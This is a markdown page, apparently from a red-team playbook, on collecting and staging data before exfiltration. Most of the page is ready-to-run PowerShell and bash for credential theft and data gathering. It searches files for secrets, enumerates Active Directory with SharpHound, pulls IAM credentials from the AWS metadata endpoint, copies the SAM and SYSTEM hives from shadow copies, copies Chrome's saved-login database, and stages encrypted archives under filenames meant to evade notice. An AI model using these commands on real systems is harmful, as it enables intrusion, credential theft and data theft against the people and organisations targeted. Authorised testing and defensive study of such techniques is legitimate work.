# Collection techniques

Before exfiltrating data, attackers consolidate and stage it. Effective
collection is methodical: understand the environment, identify what is
worth taking, gather it with minimal noise.

## Automated data discovery

Crawling for high-value files uses either built-in tooling or custom scripts.
Common targets: financial records, intellectual property, HR data, credentials,
configuration files, and private keys.

```powershell
# PowerShell: find Office documents, PDFs, and config files
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf,*.json,*.xml,*.config `
  -ErrorAction SilentlyContinue |
  Where-Object { $_.Length -lt 50MB } |
  Select-Object FullName, Length, LastWriteTime |
  Export-Csv -Path C:\Temp\filelist.csv -NoTypeInformation
```

```bash
# Linux: find recently modified sensitive files
find /home /etc /var/www -type f \( -name "*.conf" -o -name "*.key" -o -name "*.pem" \
  -o -name "*.csv" -o -name "*.sql" \) -newer /etc/passwd 2>/dev/null
```

For keyword-based discovery within documents, use native indexing or grep-style tools:

```bash
# search for credential patterns in text files
grep -rli "password\|secret\|api_key\|token\|BEGIN.*PRIVATE" /home /etc 2>/dev/null
```

## Network and environment mapping

Mapping the internal network before lateral movement or collection. Knowing
what exists is prerequisite to knowing what to take.

```powershell
# Active Directory: enumerate users, computers, and last logon
Get-ADComputer -Filter * | Select-Object Name, DNSHostName, OperatingSystem
Get-ADUser -Filter * -Properties LastLogonDate | Select-Object SamAccountName, LastLogonDate
```

```powershell
# BloodHound: ingest AD data via SharpHound for attack path analysis
.\SharpHound.exe -c All --outputdirectory C:\Temp\
# results in C:\Temp\*.json: import into BloodHound
```

Cloud instance metadata provides credentials for the attached IAM role without
any authentication:

```bash
# AWS instance metadata (accessible from any process on the instance)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

## Credential harvesting

### LSASS memory

Extracting credentials from LSASS requires local admin or SYSTEM. Modern
environments run Credential Guard which blocks plaintext password extraction,
but NTLM hashes and Kerberos tickets remain accessible.

The credential harvesting techniques are covered in detail in the
[credential harvesting runbook](../runbooks/credential-harvesting.md).

### SAM database

The SAM database contains local account hashes. Offline extraction from
a volume shadow copy avoids touching LSASS:

```powershell
# copy SAM and SYSTEM hive from shadow copy without touching LSASS
vssadmin list shadows
$shadow = '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1'
cmd /c "copy $shadow\Windows\System32\config\SAM C:\Temp\SAM"
cmd /c "copy $shadow\Windows\System32\config\SYSTEM C:\Temp\SYSTEM"
# extract hashes offline with secretsdump.py or similar
```

### Browser credential stores

Browsers store saved credentials in encrypted databases. Extraction requires
running as the target user (DPAPI context):

```powershell
# Chrome login data
$src = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Copy-Item $src C:\Temp\chrome_login.db
# extract with a tool that handles DPAPI decryption
```

### Cloud CLI credential files

```powershell
# check for stored cloud credentials (plaintext or DPAPI-encrypted)
$paths = @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:APPDATA\gcloud\credentials.db"
)
$paths | Where-Object { Test-Path $_ } | ForEach-Object { Write-Output "Found: $_" }
```

## SaaS and cloud collection

Once identity is controlled, collection from SaaS platforms uses the
platform's own APIs. This is covered in the
[SaaS harvesting runbook](../runbooks/saas-harvesting.md).

## Staging before exfiltration

Collected data needs to be staged: compressed, possibly encrypted, and
placed somewhere that can be exfiltrated without leaving a trail of individual
file accesses:

```powershell
# compress a staged collection to a temp directory
Compress-Archive -Path C:\Temp\collected -DestinationPath C:\Temp\out.zip
```

```bash
# Linux: archive and optionally encrypt
tar czf /tmp/staged.tgz /tmp/collected/
# or with encryption:
tar czf - /tmp/collected/ | openssl enc -aes-256-cbc -pass pass:KEY -out /tmp/staged.enc
```

Use paths and filenames that blend into the environment: `C:\Windows\Temp\`,
`/tmp/`, and filenames matching legitimate system activity.
